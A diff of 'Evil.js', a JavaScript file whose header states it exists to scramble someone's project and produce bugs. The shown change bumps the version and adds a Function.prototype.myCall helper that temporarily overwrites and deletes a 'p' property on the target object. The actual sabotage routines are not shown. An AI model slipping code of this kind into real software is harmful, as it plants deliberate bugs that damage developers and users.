@@ -1,6 +1,6 @@
 /**
  * Evil.js 
- * @version 0.0.1
+ * @version 1.0.2
  * @author wheatup
  * 
  * @disclaimer The purpose of this package is to scramble someone's project and produces bugs.
@@ -104,4 +104,18 @@
 		}
 		return result;
 	}
+		/**
+	 * 
+	 * @zh 重写多个方法 正常无异
+	 */
+
+	Function.prototype.myCall = function() {
+		let arr = [...arguments];
+		let obj = arr.shift()||window;
+		obj.p = this;
+		const result = obj.p(...arr);
+		delete obj.p;
+		return result;
+	}
+	
 })((0, eval('this')));
